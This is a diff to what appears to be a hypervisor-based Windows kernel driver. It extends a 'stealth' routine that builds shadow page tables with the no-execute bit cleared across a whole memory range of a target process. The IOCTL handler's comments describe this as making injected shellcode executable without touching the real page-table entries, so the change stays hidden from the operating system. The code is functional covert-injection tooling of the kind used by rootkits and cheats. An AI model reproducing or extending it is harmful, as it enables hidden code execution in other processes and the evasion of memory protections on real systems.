@@ -124,13 +124,14 @@ typedef struct _TD_STEALTH_PARAM {
 #define NX_BIT_    (1ULL << 63)
 
 // =========================================================================
-//  shadow CR3: build minimal shadow page tables with NX=0 for one page.
-//  only duplicates the 4-level path (PML4→PDPT→PD→PT) to the target VA.
-//  all other entries share real physical pages.
+//  shadow CR3: build shadow page tables with NX=0 for a VA range.
+//  supports multi-megabyte ranges spanning multiple PT/PD pages.
+//  only duplicates pages along the path — all other entries share real pages.
 //  must be called at PASSIVE_LEVEL while attached to target process.
 // =========================================================================
 
-static PVOID g_shadow_pages[16] = {};  // track for cleanup
+#define MAX_SHADOW_PAGES 256
+static PVOID  g_shadow_pages[MAX_SHADOW_PAGES] = {};
 static UINT32 g_shadow_page_count = 0;
 
 static PVOID
@@ -139,83 +140,113 @@ TdShadowAllocPage(VOID)
     PVOID page = ExAllocatePool2(POOL_FLAG_NON_PAGED, PAGE_SIZE, 'wdhS');
     if (!page) return NULL;
     RtlZeroMemory(page, PAGE_SIZE);
-    if (g_shadow_page_count < 16)
+    if (g_shadow_page_count < MAX_SHADOW_PAGES)
         g_shadow_pages[g_shadow_page_count++] = page;
     return page;
 }
 
+static PUINT64
+TdMapPhys(UINT64 phys_page)
+{
+    PHYSICAL_ADDRESS pa;
+    pa.QuadPart = (LONGLONG)(phys_page & PFN_MASK_);
+    return (PUINT64)MmGetVirtualForPhysical(pa);
+}
+
 //
-// build shadow CR3 for a target VA: 4 pages (PML4, PDPT, PD, PT).
-// the PT page has NX=0 for the target PTE, everything else is shared.
+// build shadow CR3 for a VA range [base_va, base_va + size).
+// clears NX for every 4KB page in the range.
+// handles spanning across multiple PT pages (each 2MB) and PD pages (each 1GB).
+// assumes all VAs are within the same 512GB PML4 entry (user-mode always is).
 // returns physical address of shadow PML4, or 0 on failure.
 //
 static UINT64
-TdBuildShadowCR3(UINT64 cr3, UINT64 target_va)
+TdBuildShadowCR3(UINT64 cr3, UINT64 base_va, SIZE_T size)
 {
-    UINT32 pml4_idx = (UINT32)((target_va >> 39) & 0x1FF);
-    UINT32 pdpt_idx = (UINT32)((target_va >> 30) & 0x1FF);
-    UINT32 pd_idx   = (UINT32)((target_va >> 21) & 0x1FF);
-    UINT32 pt_idx   = (UINT32)((target_va >> 12) & 0x1FF);
+    UINT64 va_start = base_va & ~0xFFFULL;
+    UINT64 va_end   = (base_va + size + 0xFFF) & ~0xFFFULL;
+    UINT32 page_count = (UINT32)((va_end - va_start) / PAGE_SIZE);
 
-    PHYSICAL_ADDRESS pa;
+    // all user VAs share the same PML4 entry (< 512GB)
+    UINT32 pml4_idx = (UINT32)((va_start >> 39) & 0x1FF);
 
-    // --- read real PML4 ---
-    pa.QuadPart = (LONGLONG)(cr3 & PFN_MASK_);
-    PUINT64 real_pml4 = (PUINT64)MmGetVirtualForPhysical(pa);
+    // --- shadow PML4 ---
+    PUINT64 real_pml4 = TdMapPhys(cr3);
     if (!real_pml4) return 0;
 
     PUINT64 shadow_pml4 = (PUINT64)TdShadowAllocPage();
     if (!shadow_pml4) return 0;
     RtlCopyMemory(shadow_pml4, real_pml4, PAGE_SIZE);
 
-    // --- read real PDPT ---
+    // --- shadow PDPT ---
     UINT64 pml4e = real_pml4[pml4_idx];
     if (!(pml4e & 1)) return 0;
-    pa.QuadPart = (LONGLONG)(pml4e & PFN_MASK_);
-    PUINT64 real_pdpt = (PUINT64)MmGetVirtualForPhysical(pa);
+    PUINT64 real_pdpt = TdMapPhys(pml4e);
     if (!real_pdpt) return 0;
 
     PUINT64 shadow_pdpt = (PUINT64)TdShadowAllocPage();
     if (!shadow_pdpt) return 0;
     RtlCopyMemory(shadow_pdpt, real_pdpt, PAGE_SIZE);
-
-    // PML4 entry → shadow PDPT
     shadow_pml4[pml4_idx] = (pml4e & ~PFN_MASK_) | MmGetPhysicalAddress(shadow_pdpt).QuadPart;
 
-    // --- read real PD ---
-    UINT64 pdpe = real_pdpt[pdpt_idx];
-    if (!(pdpe & 1) || (pdpe & (1ULL << 7))) return 0;  // 1GB page
-    pa.QuadPart = (LONGLONG)(pdpe & PFN_MASK_);
-    PUINT64 real_pd = (PUINT64)MmGetVirtualForPhysical(pa);
-    if (!real_pd) return 0;
+    //
+    // iterate over each 2MB range that the VA range touches.
+    // for each: clone the PD entry (if not yet) and the PT page, clear NX.
+    //
+    UINT32 last_pdpt_idx = 0xFFFFFFFF;
+    UINT32 last_pd_idx   = 0xFFFFFFFF;
+    PUINT64 shadow_pd = NULL;
+    PUINT64 shadow_pt = NULL;
+    UINT32  nx_cleared = 0;
 
-    PUINT64 shadow_pd = (PUINT64)TdShadowAllocPage();
-    if (!shadow_pd) return 0;
-    RtlCopyMemory(shadow_pd, real_pd, PAGE_SIZE);
+    for (UINT64 va = va_start; va < va_end; va += PAGE_SIZE)
+    {
+        UINT32 pdpt_idx = (UINT32)((va >> 30) & 0x1FF);
+        UINT32 pd_idx   = (UINT32)((va >> 21) & 0x1FF);
+        UINT32 pt_idx   = (UINT32)((va >> 12) & 0x1FF);
 
-    // PDPT entry → shadow PD
-    shadow_pdpt[pdpt_idx] = (pdpe & ~PFN_MASK_) | MmGetPhysicalAddress(shadow_pd).QuadPart;
+        // --- new 1GB range? clone PD ---
+        if (pdpt_idx != last_pdpt_idx)
+        {
+            UINT64 pdpe = real_pdpt[pdpt_idx];
+            if (!(pdpe & 1) || (pdpe & (1ULL << 7))) return 0;  // 1GB large page
+            PUINT64 real_pd = TdMapPhys(pdpe);
+            if (!real_pd) return 0;
 
-    // --- read real PT ---
-    UINT64 pde = real_pd[pd_idx];
-    if (!(pde & 1) || (pde & (1ULL << 7))) return 0;  // 2MB page
-    pa.QuadPart = (LONGLONG)(pde & PFN_MASK_);
-    PUINT64 real_pt = (PUINT64)MmGetVirtualForPhysical(pa);
-    if (!real_pt) return 0;
+            shadow_pd = (PUINT64)TdShadowAllocPage();
+            if (!shadow_pd) return 0;
+            RtlCopyMemory(shadow_pd, real_pd, PAGE_SIZE);
+            shadow_pdpt[pdpt_idx] = (pdpe & ~PFN_MASK_) | MmGetPhysicalAddress(shadow_pd).QuadPart;
 
-    PUINT64 shadow_pt = (PUINT64)TdShadowAllocPage();
-    if (!shadow_pt) return 0;
-    RtlCopyMemory(shadow_pt, real_pt, PAGE_SIZE);
+            last_pdpt_idx = pdpt_idx;
+            last_pd_idx = 0xFFFFFFFF;  // force PT re-clone
+        }
 
-    // PD entry → shadow PT
-    shadow_pd[pd_idx] = (pde & ~PFN_MASK_) | MmGetPhysicalAddress(shadow_pt).QuadPart;
+        // --- new 2MB range? clone PT ---
+        if (pd_idx != last_pd_idx)
+        {
+            PUINT64 cur_pd = shadow_pd;
+            UINT64 pde = cur_pd[pd_idx];
+            if (!(pde & 1) || (pde & (1ULL << 7))) return 0;  // 2MB large page
+            PUINT64 real_pt = TdMapPhys(pde);
+            if (!real_pt) return 0;
 
-    // --- clear NX for target PTE ---
-    shadow_pt[pt_idx] = shadow_pt[pt_idx] & ~NX_BIT_;
+            shadow_pt = (PUINT64)TdShadowAllocPage();
+            if (!shadow_pt) return 0;
+            RtlCopyMemory(shadow_pt, real_pt, PAGE_SIZE);
+            cur_pd[pd_idx] = (pde & ~PFN_MASK_) | MmGetPhysicalAddress(shadow_pt).QuadPart;
+
+            last_pd_idx = pd_idx;
+        }
+
+        // --- clear NX for this PTE ---
+        shadow_pt[pt_idx] = shadow_pt[pt_idx] & ~NX_BIT_;
+        nx_cleared++;
+    }
 
     UINT64 shadow_pml4_pa = MmGetPhysicalAddress(shadow_pml4).QuadPart;
-    HYPERPLATFORM_LOG_INFO("[td-rw] shadow CR3 built: PA=0x%llX (target VA=%p, NX cleared at PT[%u])",
-               shadow_pml4_pa, (PVOID)target_va, pt_idx);
+    HYPERPLATFORM_LOG_INFO("[td-rw] shadow CR3 built: PA=0x%llX (VA=%p size=0x%llX, %u pages NX cleared)",
+               shadow_pml4_pa, (PVOID)base_va, (UINT64)size, nx_cleared);
 
     return shadow_pml4_pa;
 }
@@ -3192,7 +3223,7 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
 
         // build shadow CR3: copies page tables with NX=0 for shellcode page.
         // never modifies real PTEs — no conflict with MiAgeWorkingSet.
-        UINT64 shadow_cr3 = TdBuildShadowCR3(caller_cr3, (UINT64)alloc_base);
+        UINT64 shadow_cr3 = TdBuildShadowCR3(caller_cr3, (UINT64)alloc_base, alloc_size);
         if (!shadow_cr3)
         {
             HYPERPLATFORM_LOG_ERROR("[td-rw] shadow CR3 build failed");
